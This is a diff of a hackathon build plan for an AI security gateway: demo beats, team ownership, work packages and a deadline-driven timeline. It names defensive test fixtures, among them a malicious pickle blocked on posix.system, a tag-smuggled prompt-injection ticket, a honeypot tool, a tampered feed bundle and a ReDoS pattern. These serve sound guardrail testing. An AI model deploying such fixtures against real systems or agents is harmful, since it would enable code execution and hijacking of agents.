 | 8 | 4:50-5:30 | **security analyst** (B) | `aicl scan evil.pt`, then a truncated pickle, then its safetensors twin; `web_fetch` to `ray:8265/api/jobs/`; add SIG-9001 to `feed/rules/90-judge.yaml` + `make feed-publish`; then hand-edit a byte of the bundle | pickle **blocked** (posix.system GLOBAL), truncated **fail-closed**, safetensors allowed; Ray call denied (C20); header `feed #43 ✓` in < 5 s and the new IOC blocks the next request; tampered bundle **rejected**, red feed cell | C18, C19, C20 | pre-generated fixtures |
-| 9 | 5:30-6:00 | **support-bot** + Overview spend panel | flaky-tool loop; a request with `n=50` / `max_tokens: -1` | 4th identical call → **circuit open** (C05); "RUNAWAY LOOP STOPPED" row; burn-down; race tile **"200 fired, 50 admitted, 0% overshoot, 2 replicas"**; `400 invalid_max_tokens` | C03, C04, C05 | screenshot of race-test output |
+| 9 | 5:30-6:00 | **support-bot** + Overview spend panel | flaky-tool loop (`facts_flaky`, S8); a request with `n=50` / `max_tokens: -1` | 4th identical call → **circuit open** (C05); "RUNAWAY LOOP STOPPED" row; burn-down; race tile **"200 fired, 50 admitted, 0% overshoot, 2 replicas"**; `400 invalid_max_tokens` | C03, C04, C05 | screenshot of race-test output |
 | 10 ★ | 6:00-6:40 | **CISO** view (F) | Threats → Export CSV; edit one line of `audit/gw-1-*.jsonl` → **Verify**; `docker compose stop guard` → re-run S4; **Run self-test** | Verify names the exact `seq`; header **DEGRADED**, fail-to-taint counter, **S4 still denied**; 156 cases, GAP vs FAIL; perf strip shows p95 overhead from `reports/perf.md` | C25, C32, self-test | `make test` terminal recording |
 | 11 ★ | 6:40-7:00 | L | Adoption + scale slide: one `base_url`, one MCP URL, managed-settings clip (P1), 2 stateless replicas + Valkey, K8s mapping, all permissive licences, runs offline. **Residual-risk slide** (§14.2) | — | — | slide |
 
@@ -1816,6 +1857,7 @@ The rules from brief §5.12 apply:
 | "Can the agent reach approvals or policy?" | No route: C35 + fence test |
 | "Isn't this the Claude apps gateway?" | §2.4 table: vendor-neutral, local compute budgets, guardrails, signed feed, self-test, no fail-open default |
 | "I typed `enabeld: false`. Did I just disable PII?" | No: rejected by the strict schema, LKG kept |
+| "What about a ReDoS pattern like `(a+)+$`?" | It is accepted on purpose: RE2 matches in linear time, so ReDoS can't happen here (R7: ~0.2 ms vs 380-740 ms in Python `re`). What gets rejected is regex syntax RE2 cannot run in linear time (lookaround, backreferences) |
 | "What does it *not* stop?" | Residual register (§14.2) |
 
 ---
@@ -1826,62 +1868,84 @@ The rules from brief §5.12 apply:
 
 | Role | Lane | Owns | On stage |
 |---|---|---|---|
-| **L** (lead / integrator) | contracts, harness, evidence, delivery | `contracts/`, repo/CI/compose/networks/fence, case runner (incl. the `steps` executor) + `make test`, `control` skeleton + SSE + header/health/replicas + Playground endpoint, live self-test, posture/coverage, invariant suites, skeleton and storyline tests, scripted-agent CLI wrapper, `make demo-offline/reset-demo/keys`, README/JUDGES/PDF/submission, checkpoints and cut decisions | narrates |
-| **A** | gateway core and streaming | app, `mock-llm`, policy engine + hot reload + versions + heartbeat, identity (vk + JWT), C02/C26/C36, `/v1/runs` + run tokens (C33 identity half), pipeline engine + C32 + verdict cache + Server-Timing + metrics, streaming holdback + C12 + tool-call buffering + LLM-edge C14/C24 hook (pairs with D), `lb` + 2 replicas, C27 canary | architecture and performance Q&A |
-| **B** | deterministic detection, feed, audit | audit writer/chain/verify + `canonical.py`, C06, C07, C08 multi-view + `destinations.py` (extract/canonicalise/skeleton), signature engine (all P0 rule types), feed service + `feedctl publish` + gateway client, `control` threat/event/KPI queries, integrity/checkpoints, exports, feed endpoint | guardrails and feed Q&A |
-| **C** | models, budgets, semantic, artifacts | Valkey ACL + Lua ledger, C03/C04/C05 numbers, compute-ms, `/v1/me` data, `guard` sidecar (engines, windows, batching, stub), multilingual kNN + EN/PL exemplars + C11 topic pack, C18 artifact gate, spend endpoints + race test, `make doctor/warm`, Ollama ops + H2 latency measurement | budgets and models Q&A |
-| **D** | agents, MCP, taint | MCP edge (FastMCP or thin proxy), demo MCP servers in sandbox containers, `aicl.tools` + validators + C05 counters + C14/C17 hooks, **C24 taint + provenance** (owns the H12 gate), C15/C16/C31 middleware, `/api/runs` and `/api/mcp/tools` data | runs the agent terminal |
+| **L** (lead / integrator) | contracts, harness, evidence, delivery | `contracts/`, repo/CI/compose/networks/fence, case runner (incl. the `steps` executor) + `make test`, `control` skeleton + SSE + header/health/replicas + Playground endpoint, live self-test, posture/coverage, invariant suites, skeleton and storyline tests, `make demo-offline/reset-demo/keys/doctor/warm`, README/JUDGES/PDF/submission, checkpoints and cut decisions | narrates |
+| **A** | gateway core and streaming | app, `mock-llm`, policy engine + hot reload + versions + heartbeat, identity (vk + JWT) + `tools/mint_jwt.py`, C02/C26/C36, `/v1/runs` + run tokens (C33 identity half), pipeline engine + C32 + verdict cache + Server-Timing + metrics, streaming holdback + C12 mechanics and URL extraction + tool-call buffering + LLM-edge C14/C24 hook (pairs with D), `lb` + 2 replicas, C27 canary | architecture and performance Q&A |
+| **B** | deterministic detection, feed, audit | audit writer/chain/verify + `canonical.py`, C06, C07, C08 multi-view + `destinations.py` (extract/canonicalise/skeleton), signature engine (P0 rule types), C12 rule packs + allowlist semantics, **C20 rules** (`http_request` packs + the Ollama-admin-API floor), feed service + `feedctl publish` + gateway client, `control` threat/event/KPI/policy-history queries, integrity/checkpoints, exports | guardrails and feed Q&A |
+| **C** | models, budgets, semantic, artifacts | Valkey ACL + Lua ledger (incl. the `tool_units` unit), C03/C04/C05 numbers, compute-ms, `/v1/me` data, `guard` sidecar (engines, windows, batching, stub) + the gateway-side guard client, multilingual kNN + EN/PL exemplars + C11 topic pack, C18 artifact gate, spend endpoints + race test, `tools/seed.py`, Ollama ops + H2 latency measurement | budgets and models Q&A |
+| **D** | agents, MCP, taint | MCP edge (FastMCP or thin proxy), demo MCP servers in sandbox containers, `aicl.tools` + validators + C05 counters + per-tool `cost_units` wiring + C14/C17/C20 hooks, **C24 taint + provenance** (owns the H12 gate), C15/C16/C31 middleware, `/api/runs` and `/api/mcp/tools` data, scripted-agent CLI (`demo-agent`) | runs the agent terminal |
 | **F** | console (UI only) | Claude Design brief + visual system, SPA (header + 4 pages), seeded-history rendering, slide visuals and screenshots | drives the console |
 
-### 13.2 P0 work packages (AI-assisted focused hours; about 82 h in total)
+### 13.2 P0 work packages (AI-assisted focused hours; about 79.5 h in total)
 
 | WP | Owner | Work package | Est. | Needs (from, by) | Delivers (to, by) |
 |---|---|---|---|---|---|
-| L1 | L | repo, `contracts/` commit (pre-drafted), CI, CLAUDE.md, CODEOWNERS, compose with 6 networks, `fence-probe`; **run the probe on every demo Mac** | 2.0 | this spec | everyone, **H1** |
-| L2 | L | case runner (YAML → pytest, incl. a `steps` executor for raw MCP/LLM calls), mutators subset, meta-tests, `rich` summary, JUnit/HTML, `compose.test.yaml` | 3.0 | `mock-llm` (A1, H3) | case writing for all owners, H4.5 |
+| L1 | L | repo, `contracts/` commit (drafted before H0 as text/schema only; code starts at H0, Q16), CI, CLAUDE.md, CODEOWNERS, compose with 6 networks, `fence-probe` (by name and raw IP); **run the probe on every demo Mac**; build `aicl-pybase` from the real lock (§13.8) | 2.0 | this spec | everyone, **H1** |
+| L2 | L | case runner (YAML → pytest, incl. a `steps` executor for raw MCP/LLM calls), meta-tests, `rich` summary, JUnit/HTML, `compose.test.yaml` (v1.1: the mutators moved to P1 #8) | 2.5 | `mock-llm` (A1, H3) | case writing for all owners, H4.5 |
 | L3 | L | `control` skeleton: admin auth, SPA static, audit tailer → SSE hub, `/api/header`, `/api/replicas`, `/api/health` | 2.0 | B1 events, A2 heartbeats | F, H5 (stream) / H8 (header) |
 | L4 | L | invariant suites: fence/admin isolation, **detectors-off overlay with S4/S5 cases**, run-token escape | 1.0 | D4, B4 | **H11 → H12 gate** |
 | L5 | L | live self-test runner (states, exposure), auto-run on reload, `/api/selftest/*` | 2.0 | A4 | F, H11 |
-| L6 | L | posture + coverage + `frameworks.yaml`; `/api/posture`, `/api/coverage`, `/api/controls`, `/api/policy/history` | 2.0 | L5 | F, H13 |
+| L6 | L | posture + coverage + `frameworks.yaml` content (format frozen at H1); `/api/posture`, `/api/coverage`, `/api/controls` (v1.1: `/api/policy/history` moved to B7) | 1.5 | L5 | F, H13 |
 | L7 | L | `/api/playground/inspect` (calls through `lb` as a demo principal, composes stages from the audit event) | 1.0 | L3, A4 | F, H10 |
-| L8 | L | `test_walking_skeleton.py` (IC1), `test_demo_storyline.py` (IC4), scripted-agent CLI over case steps, `make demo-offline/reset-demo/keys` | 1.5 | all | H5 / H14 |
-| A1 | A | app factory, settings, `/healthz`; `mock-llm` v0 (OpenAI SSE, Ollama native, directives, `sim/*` pricing, `/_mock/calls`) | 2.0 | contracts | L2, H3 |
+| L8 | L | `test_walking_skeleton.py` (IC1), `test_demo_storyline.py` (IC4), `make demo-offline/reset-demo/keys`, `make doctor/warm` (v1.1: from C7; checks per `docs/08` §2.6; the scripted-agent CLI moved to D6) | 1.5 | all; C's Ollama/ONNX check list | H5 / H6 (doctor) / H14 |
+| A1 | A | app factory, settings, `/healthz`; `mock-llm` v0 (OpenAI SSE, directives, `sim/*` pricing, `/_mock/calls`; v1.1: the Ollama-native mock moved to P1 #11) | 1.5 | contracts | L2, H3 |
 | A2 | A | policy engine: pydantic model → `policy.schema.json`, limits, watch + 1 s sha poll, compile protocol, LKG, version map, heartbeat, `policy_change` | 2.5 | contracts | all detectors, H4.5 |
-| A3 | A | identity (vk + JWT/JWKS + `group_map`), effective rights, C02 + `/v1/models` + `/v1/me`, C26, C36, **`/v1/runs` + run tokens + sticky fallback** | 2.5 | C1 | IC1 (keys/models) H5; runs **H8** |
+| A3 | A | identity (vk + JWT/JWKS + `group_map`), effective rights, C02 + `/v1/models` + `/v1/me`, C26, C36, **`/v1/runs` + run tokens + sticky fallback**; `tools/mint_jwt.py` (v1.1, IC1 step 3) | 2.5 | C1 | IC1 (keys/models/JWT) H5; runs **H8** |
 | A4 | A | pipeline engine: tiers, combine, short-circuit, redaction apply, C32 fail modes, verdict cache, Server-Timing, Prometheus | 2.0 | B2 | minimal H5, full H9 |
-| A5 | A | streaming: SSE pass-through, **trigger-aware holdback**, C12 sanitizer (mechanics + URL rules), tool-call buffering, **LLM-edge C14/C24 hook** (pair with D), `include_usage`, termination, trailing timing comment, `stream_mode: buffer` | 4.0 | D3, D4 | basic stream at IC2 H8; full H11 |
+| A5 | A | streaming: SSE pass-through, **trigger-aware holdback**, C12 sanitizer (holdback mechanics + URL extraction; B owns the rule packs and allowlist semantics), tool-call buffering, **LLM-edge C14/C24 hook** (pair with D), `include_usage`, termination, trailing timing comment, `stream_mode: buffer` | 4.0 | D3, D4 | basic stream at IC2 H8; full H11 |
 | A6 | A | `lb` Caddyfile + `gw-2` + heartbeat wiring | 0.5 | A2 | IC2 H8 |
 | A7 | A | C27 canary: inject, trigger, tool-arg check | 0.5 | A5 | H12 |
 | B1 | B | audit event builder, per-replica chain writer (bounded queue, batched fsync), `canonical.py`, `aicl audit verify` | 2.5 | contracts | skeleton **H3.5** |
 | B2 | B | C06 secrets (~30 patterns + entropy) | 1.0 | A2 compile hook | skeleton H4.5 |
-| B3 | B | signature engine: regex / keyword / http_request / url_ioc / package_ioc / hash / pickle_globals; `applies_to` mapping; unknown types skipped | 2.0 | — | D3, C5, H7 |
+| B3 | B | signature engine: regex / keyword / http_request / url_ioc / hash / pickle_globals (v1.1: `package_ioc` moved to P1 #17 and is skipped and listed until then); `applies_to` mapping; unknown types skipped; **C20 rules** (`http_request` packs compiled into hard exclusions + the Ollama-admin-API floor) | 1.5 | frozen `contracts/detector.py` | rule-engine stub + static dev feed bundle file (unsigned, sha-pinned) **H4.5** (D3a, IC1); engine to D3, C5, H7 |
 | B4 | B | C08 multi-view normaliser + `destinations.py` (extract, canonicalise, TR39 skeleton) | 2.5 | — | extractor to D by **H7**; views H8:30 |
-| B5 | B | feed service (`feedctl publish`: validate, vectors, serial, sign; `GET /bundle`) + gateway client (verify, **persisted serial**, expiry/stale, vectors, swap, `feed_update`, local override tighten-only) | 2.5 | B3 | H11:30 |
-| B6 | B | C07 checksum PII + PL false-positive guards | 1.0 | B4 | H12:30 |
-| B7 | B | in `control`: `/api/threats`, `/api/events/*`, `/api/kpis` (DuckDB, threats by H8:30); checkpoint signer + witness; `/api/integrity` + verify; `/api/export` (JSONL/CSV); `/api/feed` | 2.5 | L3 | threats H8:30; rest H14 |
-| C1 | C | Valkey ACL/requirepass; Lua reserve/settle over all scopes, leases, concurrency ZSET, GCRA, price table, warn thresholds, ledger-down modes | 3.0 | contracts | stub H2, **real H5** |
-| C2 | C | C04 hygiene (`max_tokens`/`n`/options/size), compute-ms wall clock, `/v1/me` data, 429 contract, tool units + run USD hooks | 1.5 | C1 | H6.5 |
-| C3 | C | `guard`: ONNX engines (protectai-v2 baked; PG2-86M optional), windows + batching, process pool, `/v1/inspect`, stub, health; **H2 latency measurement on the demo Mac** | 3.0 | pre-exported ONNX | stub H6, ONNX **H9** |
+| B6 | B | C07 checksum PII + PL false-positive guards (v1.1: before B5) | 1.0 | B4 | **H9:30** (IC3 beats 2 and 4) |
+| B5 | B | feed service (`feedctl publish`: validate, vectors, serial, sign; `GET /bundle`) + gateway client (verify, **persisted serial**, expiry/stale, vectors, swap, `feed_update`, local override tighten-only) | 2.5 | B3, B6 | **H12:30** (v1.1: IC3 runs on the dev bundle; the signed feed is first needed at IC4, for beat 8 and the feed suite) |
+| B7 | B | in `control`: `/api/threats`, `/api/events/*`, `/api/kpis` (DuckDB, threats by H8:30); `/api/policy/history` (v1.1, from L6); checkpoint signer + witness; `/api/integrity` + verify; `/api/export` (JSONL/CSV) (v1.1: `/api/feed` moved to P1 #6) | 2.5 | L3; L's derived policy diff | threats H8:30; policy history H13; rest H14 |
+| C1 | C | Valkey ACL/requirepass; Lua reserve/settle over all scopes and units (incl. `tool_units`), leases, concurrency ZSET, GCRA, price table, warn thresholds, ledger-down modes | 3.0 | contracts | stub H2, **real H5** |
+| C2 | C | C04 hygiene (`max_tokens`/`n`/options/size), compute-ms wall clock, `/v1/me` data, 429 contract, run USD hook (v1.1: the per-tool cost-unit hook was double-counted with D3b and now lives only there) | 1.0 | C1 | H6.5 |
+| C3 | C | `guard`: **`GUARD_ENGINE=stub` first (0.5 h)**, then ONNX engines (protectai-v2 baked; PG2-86M optional), windows + batching, process pool, `/v1/inspect`, health; the **gateway-side guard client** (calls `/v1/inspect` with the §5.1 deadline and hands errors to A4's C32 fail modes); **H2 latency measurement on the demo Mac** | 3.0 | pre-exported ONNX | stub **H4.5** (IC1), client H6, ONNX **H9** |
 | C4 | C | multilingual MiniLM-L12 kNN; EN+PL exemplars (injection, jailbreak, harm); **C11 topic pack** EN+PL | 2.5 | C3, B3 | H11:30 |
 | C5 | C | C18 artifact gate lite: pickle allowlist walk, fail-closed, torch zip, safetensors header, hashes, `/v1/artifacts/scan` + `aicl scan` + fixture generator | 2.0 | B3 (pickle_globals) | H14 |
 | C6 | C | in `control`: `/api/spend/summary`, `/api/spend/burndown`; **cross-replica race test** (gate) + ledger-down test | 1.5 | C1, A6 | race H11; spend H13 |
-| C7 | C | `make doctor` / `make warm` (Docker memory, ports, Ollama version and models, ONNX files) | 0.5 | — | H6 |
+| C7 | L | v1.1: `make doctor` / `make warm` moved to L8; C supplies the Ollama and ONNX checks | — | — | — |
+| C8 | C | `tools/seed.py` (v1.1, previously unowned): 7 days, ~20k events, `synthetic: true`, written with B1's event builder, org shape per Q12 | 0.5 | B1 (H3.5), Q12 (H5) | F (Overview charts), C6, H13 |
 | D1 | D | **MCP spike**: FastMCP 4 `create_proxy` to a remote HTTP server + middleware, *or* a thin JSON-RPC proxy (tools/list, tools/call, local `initialize`, `server/discover`). **Go/no-go at H2.5** | 1.5 | — | **H2.5** |
 | D2a | D | gate-critical demo servers as Streamable HTTP containers: `web` (`ticket-42` with tag-smuggled text), `crm`, `bankdb`, `mail` | 1.5 | D1 | H4 |
-| D3a | D | `aicl.tools` core: registry, labels, risk ceiling/visibility, jsonschema args, SSRF + SQL + email validators | 2.0 | B3, C1 | A5, H6:30 |
+| D3a | D | `aicl.tools` core: registry, labels, risk ceiling/visibility, jsonschema args, SSRF + SQL + email validators | 2.0 | frozen `contracts/detector.py` + B3's rule-engine stub (H4.5), C1 stub (H2); the full engine (H7) drops in behind the same interface | A5, H6:30 |
 | D5a | D | MCP middleware call path: call → tools, C16 result-scan hook, label-based taint marking, vouched hashes | 1.5 | D3a | H8 |
 | D4 | D | **C24/C33 run state + sink matrix + destination sets** (with B's extractor) + spoof + fallback-run semantics; A pairs on the LLM-edge hook | 2.5 | A3, B4 | **H11 → H12 gate** |
-| D2b | D | remaining servers: `filesystem`, `facts` (v1/v2 flag), `vault` (honeypot) | 1.0 | D2a | H13 |
-| D3b | D | path / amount / IBAN / entropy validators, C17 hook, C05 counters, cost units | 1.0 | D3a | H14 |
+| D2b | D | remaining servers: `filesystem`, `facts` (v1/v2 flag + `facts_flaky` for S8 / beat 9), `vault` (honeypot) | 1.0 | D2a | H13 |
+| D3b | D | path / amount / IBAN / entropy validators, C17 hook, C05 counters, per-tool `cost_units` wiring (C owns the ledger unit), **C20 call-site hook** (≤ 0.5 h; B owns the rules) | 1.5 | D3a, B3 | H14 |
 | D5b | D | C15 pins/scan/quarantine/diff records (+ `/api/mcp/tools` data), C31 honeypot → kill | 1.5 | D2b | H15 |
+| D6 | D | scripted-agent CLI over case steps for the demo terminal (`demo-agent`; v1.1, from L8) | 0.5 | L2 | storyline + demo terminal, H14 |
 | F1 | F | brief → Claude Design: visual system + 4 page mocks (with L) | 1.5 | brief + this spec | H2 |
 | F2 | F | SPA scaffold, router, header, SSE hook + polling fallback, fixtures mode, token login; Threats table with live SSE rows | 2.0 | fixtures (L, H1:30), L3 | **IC1 H5** |
 | F3 | F | Threats drawer (Trace, Run, Evidence; MCP and Integrity tabs if time) | 3.0 | B7 | H11 |
-| F5 | F | Playground page | 2.5 | L7 | H12 |
-| F6 | F | Overview page (posture, KPI band, coverage grid, **spend panel**, health, recent changes) | 2.0 | L6, C6 | H14 |
-| F7 | F | Controls & Self-test page | 1.5 | L5, L6 | IC4 H15 |
+| F5 | F | Playground page: built on fixtures before F's sleep, **one live call by IC3**, fully live by IC4 | 2.5 | fixtures, L7 (H10) | IC3 H12 (fixtures + one live call); IC4 H15 (live) |
+| F6 | F | Overview page (posture, KPI band, coverage grid (a list if late), **spend panel**, health, recent changes) | 2.0 | L6, C6, B7 | H14 |
+| F7 | F | Controls & Self-test page: the controls table + **Run self-test** button (matrix and history only if time) | 1.0 | L5, L6 | IC4 H15 |
 
-**Per-lane load:** L 14.5 · A 14.0 · B 14.0 · C 14.0 · D 12.5 (+1 h slack for the gate) · F 12.5 (sleeps early) = **≈ 82 h**. The feature window H1-H16 is 15 h, minus about 1.5 h for meals, which gives about 13.5 h per person. Anything a lane cannot finish by IC4 is flagged off. This is J3's capacity model and P5's honest "P0 ~70% at H12, ~90% at H16" curve, with the gate items front-loaded.
+F4 was removed. IDs are not renumbered, so references stay valid; the earlier draft's stand-alone Spend page is now the spend panel in F6 (D19).
+
+**Per-lane load (v1.1):**
+
+| Lane | WPs (h) | Total |
+|---|---|---|
+| L | 2.0 + 2.5 + 2.0 + 1.0 + 2.0 + 1.5 + 1.0 + 1.5 | 13.5 |
+| A | 1.5 + 2.5 + 2.5 + 2.0 + 4.0 + 0.5 + 0.5 | 13.5 |
+| B | 2.5 + 1.0 + 1.5 + 2.5 + 1.0 + 2.5 + 2.5 | 13.5 |
+| C | 3.0 + 1.0 + 3.0 + 2.5 + 2.0 + 1.5 + 0.5 | 13.5 |
+| D | 1.5 + 1.5 + 2.0 + 1.5 + 2.5 + 1.0 + 1.5 + 1.5 + 0.5 | 13.5 |
+| F | 1.5 + 2.0 + 3.0 + 2.5 + 2.0 + 1.0 | 12.0 (sleeps early) |
+| **All** | 13.5 × 5 + 12.0 | **79.5 h** of 6 × 13.5 = **81 h** |
+
+The feature window H1-H16 is 15 h, minus about 1.5 h for meals, which gives about 13.5 h per person.
+
+- **No slack left.** Every backend lane is full, so its last P0 hour lands between IC4 (H15) and freeze (H16), and anything still red at IC4 is flagged off.
+- **D's gate slack is gone.** D no longer has a separate 1 h of gate slack; if the gate needs H11-H12, D's post-gate WPs (D2b, D3b, D5b, D6) slide toward freeze.
+- **v1.1 moves:** the mutators to P1 #8 (L); the scripted-agent CLI from L8 to D6; `/api/policy/history` from L6 to B7; `make doctor/warm` from C7 to L8; `tools/seed.py` to C8 and `tools/mint_jwt.py` to A3 (both were unowned); the Ollama-native mock to P1 #11 (A); `/api/feed` to P1 #6 and `package_ioc` to P1 #17 (B); the C2 cost-unit hook was a duplicate of D3b; the C20 hook was added to D3b (+0.5); F7 shrank 1.5 → 1.0.
+
+This is J3's capacity model and P5's honest "P0 ~70% at H12, ~90% at H16" curve, with the gate items front-loaded.
 
 **Critical path to the H12 gate** (the detectors-off S4/S5 test plus the race and the fence):
 
@@ -1908,35 +1972,72 @@ There is 30-60 min of buffer before H12. **If the gate is red at H11:30, D + A +
 | 3 | `make eval` + calibration + Polish slice + held-out numbers on Self-test | C + L | 2.0 | calibration `provisional: false` |
 | 4 | OCSF-shaped export (6003 / 2004 / 3004 + `record_integrity`) | B | 1.5 | `format=ocsf` |
 | 5 | C23 approvals (retry token, args-hash bound, single approver ≠ requester) + console card | D + F | 2.5 | `C23_approvals.enabled` |
-| 6 | Console: full Spend page + Agents & MCP page (inventory, quarantine diff, re-pin, kill switch) + `PATCH` toggles via the single-writer path | F + L | 3.5 | UI routes |
+| 6 | Console: full Spend page + Agents & MCP page (inventory, quarantine diff, re-pin, kill switch, feed panel) + `PATCH` toggles via the single-writer path; `/api/feed` (B, from P0 in v1.1) | F + L + B | 4.0 | UI routes |
 | 7 | Exploit Museum cards + scenario replay through the data plane | L + F | 1.5 | UI route |
-| 8 | Mutation kill rate + entitlement-matrix generated tests | L | 1.5 | `make test-mutation` |
+| 8 | Mutation kill rate + entitlement-matrix generated tests + the obfuscation mutators (from L2 in v1.1) | L | 2.0 | `make test-mutation`, `mutate: true` |
 | 9 | C34 MCP protocol hardening | D | 1.0 | `C34_protocol` |
 | 10 | Anthropic `/v1/messages` (tool_result-in-user handled) + managed-settings clip | A | 2.5 | route |
-| 11 | Native Ollama `/api/chat` compute durations + `downgrade` breach action | C | 1.5 | `models.*.downgrade_to` |
+| 11 | Native Ollama `/api/chat` compute durations + `downgrade` breach action + the `mock-llm` Ollama-native endpoint (A, from A1 in v1.1) | C + A | 2.0 | `models.*.downgrade_to` |
 | 12 | Live `qwen3:8b` agent mode + promote-to-test-case | D + L | 1.5 | CLI flag |
-| 13 | C27 n-gram overlap + C16 datamark spotlighting toggle | A + B | 1.0 | flags |
+| 13 | C27 n-gram overlap + C16 datamark spotlighting toggle + a nested-quantifier lint that warns on `(a+)+`-style patterns (B) | A + B | 1.0 | flags |
 | 14 | Thin agent→agent (kyc-agent as MCP tool, run-token taint inheritance) | D | 1.5 | registry entry |
 | 15 | `/v1/guard` + `/v1/decide` + Claude Code `PreToolUse` hook script | A | 2.0 | route |
 | 16 | kustomize manifests + kubeconform in CI | L | 1.0 | — |
+| 17 | `package_ioc` rule type: SIG-0013 `postmark-mcp`, the bad `nx` versions (from B3 in v1.1) | B | 0.5 | rule type |
 
-Realistically, ranks 1-6 ship (about 13 h of the ~15-18 h left on green lanes between IC3 and freeze).
+Realistically (v1.1): P0 fills the H1-H16 window (§13.2), so P1 starts only where a lane finishes P0 early. Plan (b)'s extra 2 h before freeze (§13.4) buys about 12 h, enough for ranks 1-5. Plan (a) builds no P1.
 
 **P2 (slides or roadmap):**
 - A2A proxy (C21), memory guard (C22), slopsquatting (C28);
 - Keycloak/LDAP compose profile; stock Squid shadow-AI sensor tile;
-- HF scanning mirror + GGUF template scan; Merkle/C2SP checkpoints;
+- HF scanning mirror + GGUF `chat_template` scan (SIG-0008); Merkle/C2SP checkpoints;
+- cross-message `window` view and ROT13 decoding (§5.3); SIG-0011 `tool_sequence` (§8.4); `models.*.fallback` (§5.4); C11 on LLM-out; MNPI route-local;
+- Policy diff/YAML and Audit query pages (+ `/api/policy/versions`, `/api/policy/diff`); server-side role field stripping (§11.1);
 - ECS/CEF/HEC exports; weekly LLM report; garak ASR delta;
 - call warrants for our own agent; CEL `when:` conditions; signed policy bundles (`deployment: prod`);
 - My AI page; four-eyes approvals; threshold what-if; anomaly baseline; Qwen3Guard-Stream.
 
-### 13.4 Timeline (H0 = official start; confirm the deadline wording at H0)
+### 13.4 Timeline (H0 = the moment the team starts building, after the kickoff)
+
+#### Re-baseline (v1.1): H0 and the real deadline
+
+**H0 is the moment the team starts building, after the kickoff, not the official start.**
+- The task pack was downloaded at about 12:12 CEST on 3 October, so the event has very likely started already.
+- The RULES PDF says "start no earlier than 11:00 PM Oct 3, submit by 11:00 PM Oct 4", and "PM" may be a typo for AM.
+- L confirms the deadline with the organisers at H0 (Q2). **Until it is confirmed in writing, plan (a) runs.** The team switches to (b) only on confirmation.
+
+Clock times below assume H0 ≈ 18:00 CEST on 3 October.
+
+| Milestone | Base plan (gantt and table below) | **(a) deadline 11:00 Oct 4** (~17 h) | **(b) deadline 23:00 Oct 4** (~29 h) |
+|---|---|---|---|
+| Scope | P0 + ranked P1 | **P0 only, P1 frozen** | P0 + ranked P1, plus 2 h more of P1 |
+| CF · Latency · D1 | H1 · H2 · H2:30 | same (19:00 · 20:00 · 20:30) | same |
+| IC1 walking skeleton | H5 | H5 (23:00) | H5 (23:00) |
+| IC2 | H8 | H7 (01:00) | H8 (02:00) |
+| Placeholder submission | H11 | H8 (02:00) | H11 (05:00) |
+| IC3 + H12 gate | H12 | merged with IC4 at H10:30 (04:30); D's gate chain is ~9 h of work, so it cannot come earlier | H12 (06:00) |
+| IC4 P0 complete | H15 | H10:30 (04:30) | H15 (09:00) |
+| Freeze (`rc1`) | H16 | **H11 (05:00)** | H18 (12:00) |
+| IC5 clean room | H17:30 | **H12:30 (06:30)** | H19:30 (13:30) |
+| Video · PDF v1 / v2 · repo public | H18 · H17:00 / H20:30 · H20 | H13 · H13:30 / H14:15 · H14 | H20 · H19:00 / H22:30 · H22 |
+| **Submit** | H21 | **H15 (09:00)**, 2 h before the deadline | **H23 (17:00)**, 6 h before the deadline |
+| Deadline | H24 | H17 (11:00) | H29 (23:00) |
+| Sleep (never more than two asleep) | §13.7 | nobody before freeze; then B, D H11:00-H12:30 · A, C H13:30-H15:00 · F H15:00-H16:30 (90 min each) · L 60 min H15:30-H16:30 | F H5:30-H8:30 · B, D H17:30-H20:30 · L 90 min H20:30-H22:00 · A, C H22:00-H25:00 (3 h each) |
+
+**Plan (a), pre-agreed:**
+- **Cuts.** §13.6 cuts 1-5 apply at H0. Cuts 1, 3 and 4 are P1 and frozen anyway, cut 2 is the console cuts, and cut 5 is already in force because the mutators are P1. Cuts 6-7 apply at IC2 if any lane is red. The never-cut list is unchanged.
+- **Capacity.** There are about 9 h per person before freeze (≈ 54 h) against 79.5 h of P0. Expect the IC4 flag-off rule to remove most of what is outside the never-cut list.
+- **Storyline.** The storyline is the ★ beats (0, 1, 2, 4, 5, 10, 11).
+- **Fallbacks.** IC2's red-path fallbacks (`stream_mode: buffer`, stub guard, sha-pinned dev feed) are taken at IC2 with no retry window.
+
+**Plan (b).** The base plan runs as written up to IC4. The ~5 h of buffer then buys +2 h of P1 (freeze H18), with every later checkpoint 2 h later, 3 h of sleep for everyone (L takes a 90-min nap), and a 6 h margin before the deadline.
 
 ```mermaid
 gantt
-  title Mandate build plan, H0 = official start
+  title Mandate build plan, H0 = build start
   dateFormat HH:mm
   axisFormat H%H
+  todayMarker off
   section Milestones
   CF contracts frozen + fence probe   :milestone, m0, 01:00, 2m
   Latency measured on demo Mac        :milestone, m1, 02:00, 2m
@@ -1951,51 +2052,55 @@ gantt
   Final submission                    :milestone, m10, 21:00, 2m
   section L lead
   Repo contracts CI networks fence    :l1, 00:00, 120m
-  Case runner make test skeleton      :l2, 02:00, 180m
-  Control skeleton SSE header         :l3, 05:00, 120m
-  Playground endpoint                 :l7, 07:00, 60m
-  Live self-test                      :l5, 08:00, 150m
-  Invariant cases and gate buffer     :l4, 10:30, 90m
-  Posture coverage storyline test     :l6, 12:00, 240m
-  Clean room README PDF submit        :l9, 16:00, 330m
-  Sleep                               :crit, ls, 21:30, 150m
+  Case runner make test skeleton      :l2, 02:00, 150m
+  Control skeleton SSE header         :l3, 04:30, 120m
+  Playground endpoint                 :l7, 06:30, 60m
+  Live self-test                      :l5, 07:30, 150m
+  Invariant cases and gate buffer     :l4, 10:00, 120m
+  Posture coverage doctor storyline   :l6, 12:00, 240m
+  Clean room README PDF v1            :l9, 16:00, 120m
+  Nap                                 :crit, ls, 18:00, 90m
+  Repo public PDF v2 submit           :l10, 19:30, 90m
+  Rehearsals                          :l11, 21:00, 180m
   section A core
   App mock-llm policy engine          :a1, 01:00, 270m
   Identity runs lb basic stream       :a3, 05:30, 150m
   Pipeline holdback C12 tool hook     :a5, 08:00, 240m
   Canary P0 fixes P1 bench            :a7, 12:00, 240m
-  Clean-room fixes video              :a8, 16:00, 180m
-  Sleep                               :crit, as, 19:00, 150m
+  Clean-room fixes video              :a8, 16:00, 210m
+  Sleep                               :crit, as, 19:30, 150m
   section B guards feed audit
   Audit chain verify secrets          :b1, 01:00, 210m
-  Signatures normaliser destinations  :b3, 04:30, 270m
-  Threat queries feed service         :b5, 09:00, 180m
-  PII integrity exports P1 OCSF       :b6, 12:00, 240m
-  Sleep                               :crit, bs, 16:00, 180m
-  Cases docs rehearsal                :b8, 19:00, 120m
